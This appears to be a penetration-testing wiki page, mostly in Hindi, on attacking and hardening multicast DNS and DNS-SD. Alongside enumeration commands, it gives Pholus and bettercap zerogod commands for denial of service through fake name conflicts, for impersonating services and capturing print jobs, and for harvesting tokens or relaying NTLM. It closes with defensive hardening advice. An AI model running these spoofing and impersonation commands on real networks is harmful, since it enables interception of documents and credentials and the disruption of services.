# 5353/UDP मल्टीकास्ट DNS (mDNS) और DNS-SD

{{#include ../banners/hacktricks-training.md}}

## बुनियादी जानकारी

मल्टीकास्ट DNS (mDNS) एक स्थानीय लिंक के भीतर DNS-जैसी नाम समाधान और सेवा खोज को सक्षम करता है बिना किसी यूनिकास्ट DNS सर्वर के। यह UDP/5353 और मल्टीकास्ट पते 224.0.0.251 (IPv4) और FF02::FB (IPv6) का उपयोग करता है। DNS सेवा खोज (DNS-SD, जो आमतौर पर mDNS के साथ उपयोग किया जाता है) PTR, SRV और TXT रिकॉर्ड के माध्यम से सेवाओं को सूचीबद्ध और वर्णित करने का एक मानकीकृत तरीका प्रदान करता है।
```
PORT     STATE SERVICE
5353/udp open  zeroconf
```
Key protocol details you’ll often leverage during attacks:
- .local क्षेत्र में नाम mDNS के माध्यम से हल किए जाते हैं।
- QU (Query Unicast) बिट मल्टीकास्ट प्रश्नों के लिए भी यूनिकास्ट उत्तरों का अनुरोध कर सकता है।
- कार्यान्वयन को उन पैकेट्स को नजरअंदाज करना चाहिए जो स्थानीय लिंक से नहीं आते; कुछ स्टैक्स अभी भी उन्हें स्वीकार करते हैं।
- प्रॉबिंग/घोषणा अद्वितीय होस्ट/सेवा नामों को लागू करती है; यहां हस्तक्षेप करने से DoS/“नाम कब्जा” स्थितियां उत्पन्न होती हैं।

## DNS-SD सेवा मॉडल

सेवाओं को _<service>._tcp या _<service>._udp के रूप में .local के तहत पहचाना जाता है, जैसे _ipp._tcp.local (प्रिंटर), _airplay._tcp.local (AirPlay), _adb._tcp.local (Android Debug Bridge), आदि। _services._dns-sd._udp.local के साथ प्रकारों का पता लगाएं, फिर खोजे गए उदाहरणों को SRV/TXT/A/AAAA में हल करें।

## नेटवर्क अन्वेषण और गणना

- nmap लक्ष्य स्कैन (एक होस्ट पर सीधे mDNS):
```bash
nmap -sU -p 5353 --script=dns-service-discovery <target>
```
- nmap प्रसारण खोज (सेगमेंट को सुनें और सभी DNS-SD प्रकारों/उदाहरणों की गणना करें):
```bash
sudo nmap --script=broadcast-dns-service-discovery
```
- avahi-browse (Linux):
```bash
# सेवा प्रकारों की सूची
avahi-browse -bt _services._dns-sd._udp
# सभी सेवाओं को ब्राउज़ करें और होस्ट/पोर्ट पर हल करें
avahi-browse -art
```
- Apple dns-sd (macOS):
```bash
# सभी HTTP सेवाओं को ब्राउज़ करें
dns-sd -B _http._tcp
# सेवा प्रकारों की गणना करें
dns-sd -B _services._dns-sd._udp
# एक विशिष्ट उदाहरण को SRV/TXT में हल करें
dns-sd -L "My Printer" _ipp._tcp local
```
- Packet capture with tshark:
```bash
# लाइव कैप्चर
sudo tshark -i <iface> -f "udp port 5353" -Y mdns
# केवल DNS-SD सेवा सूची प्रश्न
sudo tshark -i <iface> -f "udp port 5353" -Y "dns.qry.name == \"_services._dns-sd._udp.local\""
```

Tip: कुछ ब्राउज़र/WebRTC अस्थायी mDNS होस्टनामों का उपयोग करते हैं ताकि स्थानीय IPs को छिपाया जा सके। यदि आप वायर पर random-UUID.local उम्मीदवार देखते हैं, तो उन्हें mDNS के साथ हल करें ताकि स्थानीय IPs पर स्विच किया जा सके।

## हमले

### mDNS नाम प्रॉबिंग हस्तक्षेप (DoS / नाम कब्जा)

प्रॉबिंग चरण के दौरान, एक होस्ट नाम की अद्वितीयता की जांच करता है। धोखाधड़ी वाले संघर्षों के साथ प्रतिक्रिया देने से इसे नए नाम चुनने या विफल होने के लिए मजबूर किया जाता है। इससे सेवा पंजीकरण और खोज में देरी या रोकथाम हो सकती है।

Example with Pholus:
```bash
# Block new devices from taking names by auto-faking responses
sudo python3 pholus3.py <iface> -afre -stimeout 1000
```
### सेवा धोखाधड़ी और पहचान बनाना (MitM)

विज्ञापित DNS-SD सेवाओं (प्रिंटर, AirPlay, HTTP, फ़ाइल शेयर) की पहचान बनाकर ग्राहकों को आपके साथ कनेक्ट करने के लिए मजबूर करें। यह विशेष रूप से उपयोगी है:
- _ipp._tcp या _printer._tcp को धोखा देकर दस्तावेज़ कैप्चर करना।
- HTTP/HTTPS सेवाओं की ओर ग्राहकों को आकर्षित करना ताकि टोकन/कुकीज़ इकट्ठा कर सकें या पेलोड वितरित कर सकें।
- Windows ग्राहकों के धोखाधड़ी सेवाओं के लिए प्रमाणीकरण करते समय NTLM रिले तकनीकों के साथ संयोजन करना।

bettercap के zerogod मॉड्यूल (mDNS/DNS-SD स्पूफर/पहचानकर्ता) के साथ:
```bash
# Start mDNS/DNS-SD discovery
sudo bettercap -iface <iface> -eval "zerogod.discovery on"

# Show all services seen from a host
> zerogod.show 192.168.1.42

# Impersonate all services of a target host automatically
> zerogod.impersonate 192.168.1.42

# Save IPP print jobs to disk while impersonating a printer
> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/
> zerogod.impersonate 192.168.1.42

# Replay previously captured services
> zerogod.save 192.168.1.42 target.yml
> zerogod.advertise target.yml
```
Also see generic LLMNR/NBNS/mDNS/WPAD spoofing and credential capture/relay workflows:

{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### हाल की कार्यान्वयन समस्याओं पर नोट्स (engagements के दौरान DoS/persistence के लिए उपयोगी)

- Avahi reachable-assertion और D-Bus क्रैश बग (2023) Linux वितरणों पर avahi-daemon को समाप्त कर सकते हैं (जैसे CVE-2023-38469..38473, CVE-2023-1981), लक्षित होस्ट पर सेवा खोज को बाधित करते हैं जब तक कि पुनः प्रारंभ न किया जाए।
- Cisco IOS XE Wireless LAN Controller mDNS गेटवे DoS (2024, CVE-2024-20303) आसन्न हमलावरों को उच्च CPU चलाने और APs को डिस्कनेक्ट करने की अनुमति देता है। यदि आप VLANs के बीच एक mDNS गेटवे का सामना करते हैं, तो गलत या उच्च-दर mDNS के तहत इसकी स्थिरता के प्रति सतर्क रहें।

## Defensive considerations and OPSEC

- Segment boundaries: सुरक्षा क्षेत्रों के बीच 224.0.0.251/FF02::FB को रूट न करें जब तक कि एक mDNS गेटवे स्पष्ट रूप से आवश्यक न हो। यदि आपको खोज को ब्रिज करना है, तो allowlists और दर सीमाओं को प्राथमिकता दें।
- Windows endpoints/servers:
- mDNS के माध्यम से नाम समाधान को हार्ड-डिसेबल करने के लिए रजिस्ट्री मान सेट करें और पुनः प्रारंभ करें:
```
HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS = 0 (DWORD)
```
- प्रबंधित वातावरण में, इनबिल्ट “mDNS (UDP-In)” Windows Defender फ़ायरवॉल नियम को निष्क्रिय करें (कम से कम डोमेन प्रोफ़ाइल पर) ताकि इनबाउंड mDNS प्रोसेसिंग को रोका जा सके जबकि होम/रोमिंग कार्यक्षमता को बनाए रखा जा सके।
- नए Windows 11 बिल्ड/GPO टेम्पलेट्स पर, नीति “Computer Configuration > Administrative Templates > Network > DNS Client > Configure multicast DNS (mDNS) protocol” का उपयोग करें और इसे Disabled पर सेट करें।
- Linux (Avahi):
- जब आवश्यक न हो तो प्रकाशन को लॉक करें: `disable-publishing=yes` सेट करें, और `/etc/avahi/avahi-daemon.conf` में `allow-interfaces=` / `deny-interfaces=` के साथ इंटरफेस को प्रतिबंधित करें।
- `check-response-ttl=yes` पर विचार करें और जब तक आवश्यक न हो `enable-reflector=yes` से बचें; प्रतिबिंबित करते समय `reflect-filters=` allowlists को प्राथमिकता दें।
- macOS: जब Bonjour खोज विशिष्ट उपनेट के लिए आवश्यक न हो तो होस्ट/नेटवर्क फ़ायरवॉल पर इनबाउंड mDNS को प्रतिबंधित करें।
- Monitoring: `_services._dns-sd._udp.local` क्वेरी में असामान्य वृद्धि या महत्वपूर्ण सेवाओं के SRV/TXT में अचानक बदलाव पर अलर्ट करें; ये धोखाधड़ी या सेवा अनुकरण के संकेत हैं।

## Tooling quick reference

- nmap NSE: `dns-service-discovery` और `broadcast-dns-service-discovery`.
- Pholus: सक्रिय स्कैन, रिवर्स mDNS स्वीप, DoS और धोखाधड़ी सहायक।
```bash
# Passive sniff (timeout seconds)
sudo python3 pholus3.py <iface> -stimeout 60
# Enumerate service types
sudo python3 pholus3.py <iface> -sscan
# Send generic mDNS requests
sudo python3 pholus3.py <iface> --request
# Reverse mDNS sweep of a subnet
sudo python3 pholus3.py <iface> -rdns_scanning 192.168.2.0/24
```
- bettercap zerogod: mDNS/DNS-SD सेवाओं का पता लगाना, सहेजना, विज्ञापन करना और अनुकरण करना (ऊपर दिए गए उदाहरण देखें)।

## Spoofing/MitM

आप इस सेवा पर जो सबसे दिलचस्प हमला कर सकते हैं वह है क्लाइंट और असली सर्वर के बीच संचार में MitM करना। आप संवेदनशील फ़ाइलें (प्रिंटर के साथ संचार को MitM करना) या यहां तक कि क्रेडेंशियल प्राप्त करने में सक्षम हो सकते हैं (Windows प्रमाणीकरण)।\
अधिक जानकारी के लिए देखें:

{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## References

- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://books.google.co.uk/books/about/Practical_IoT_Hacking.html?id=GbYEEAAAQBAJ&redir_esc=y)
- [Nmap NSE: broadcast-dns-service-discovery](https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html)
- [bettercap zerogod (mDNS/DNS-SD discovery, spoofing, impersonation)](https://www.bettercap.org/modules/ethernet/zerogod/)

{{#include ../banners/hacktricks-training.md}}
